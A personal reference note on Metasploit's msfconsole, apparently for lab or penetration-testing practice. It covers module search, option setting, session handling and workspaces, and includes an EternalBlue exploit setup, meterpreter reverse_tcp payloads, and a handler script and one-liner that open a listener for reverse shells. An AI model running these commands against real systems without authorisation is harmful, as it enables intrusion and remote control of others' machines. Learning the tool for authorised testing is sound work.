
---

## Purpose

Compact reference for using msfconsole as the primary Metasploit interface. Copy into Obsidian and use in Preview or Edit.

---

## Start / environment

- Start console: `msfconsole` or `msfconsole -q` (quiet).
    
- Ensure msfdb (PostgreSQL) is running: `systemctl start postgresql` (Kali) and `msfdb init` if needed.
    
- Check DB: `db_status`.
    

---

## Navigation & help

- `help` or `?` — show basic help.
    
- `<tab>` — autocomplete commands and module paths.
    
- `search <term>` — find modules (use filters: `type:exploit`, `platform:windows`, `author:`).
    
    - Examples: `search smb`, `search type:exploit name:tomcat`.
        

---

## Loading and configuring modules

1. `use <module>` — load a module. Example: `use exploit/windows/smb/ms17_010_eternalblue`.
    
2. `show options` — list required and optional variables.
    
3. `show advanced` — show advanced options.
    
4. `show targets` — list supported target platforms/versions.
    
5. `set <VAR> <value>` — set an option. Example: `set RHOSTS 10.10.10.5`.
    
6. `setg <VAR> <value>` — set a global option across modules (e.g., `setg LHOST 10.10.14.5`).
    
7. `unset <VAR>` — unset local option.
    
8. `unsetg <VAR>` — unset global option.
    

### Common variables

- **LHOST** — attacker's IP for reverse connections.
    
- **LPORT** — local port for handler.
    
- **RHOST / RHOSTS** — target IP or range.
    
- **RPORT** — target port.
    
- **PAYLOAD** — payload to deliver.
    

Note: prefer `RHOSTS` for ranges and `RHOST` when module expects a single host.

---

## Payload selection

- `show payloads` — list payloads available for a loaded exploit.
    
- Choose staged vs non-staged depending on exploit and network reliability.
    
- Example: `set PAYLOAD windows/meterpreter/reverse_tcp`.
    

---

## Running modules

- `run` — execute module.
    
- `exploit` — same as run for exploit modules.
    
- `exploit -j` — run as background job.
    
- `jobs` — list jobs.
    
- `kill <job id>` — stop job.
    

---

## Sessions management

- `sessions -l` — list active sessions.
    
- `sessions -i <id>` — interact with session.
    
- `sessions -k <id>` — kill session.
    
- `sessions -u <id>` — upgrade a shell to meterpreter (if possible).
    
- Background a session with `background` while inside it.
    

Inside a meterpreter session: `sysinfo`, `getuid`, `ps`, `pwd`, `download`, `upload`, `execute`, `migrate`, `background`.

---

## Workspaces

- `workspace -a <name>` — add workspace.
    
- `workspace` — list current workspaces.
    
- `workspace <name>` — switch to named workspace.
    
- `workspace -d <name>` — delete workspace and data.
    

Workspaces isolate hosts, services, creds and sessions per engagement.

---

## Database & imports

- Import Nmap XML: `db_import scan.xml`.
    
- View hosts: `hosts`
    
- View services: `services`
    
- View creds: `creds`
    
- Use `hosts -R` to show routes and host details.
    

---

## Resource scripts and automation

- Resource files (`*.rc`) run msfconsole commands in sequence. Useful to start handlers and jobs.
    
- Sample handler `handler.rc`:
    

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
exploit -j
```

- Run: `msfconsole -r handler.rc` or from console `resource handler.rc`.
    

---

## Useful built-ins

- `load <plugin>` — load plugin (e.g., `load wmap`).
    
- `save` — save current workspace and globals.
    
- `version` — msf version.
    
- `banner` — display banner.
    

---

## Tips & gotchas

- Use `setg LHOST <ip>` once to avoid repeating LHOST per module.
    
- When testing payloads locally, verify firewall rules and NAT.
    
- Stagers require open outbound connectivity from target to your handler.
    
- If a module fails repeatedly, run `set VERBOSE true` and `set DEBUG true` where available.
    
- `db_import` requires msfdb running and connected.
    

---

## Quick examples

- Start, import scan, run smb enum, and search:
    

```
msfconsole -q
db_import fullscan.xml
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.0/24
run
search type:exploit smb
```

- Start handler from shell:
    

```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; exploit -j"
```

---

## Recommended reading

- `msfconsole` help pages and `docs` folder in Metasploit repo.
    
- Rapid7 Metasploit documentation and module docs.
    

_End of MSFconsole fundamentals note._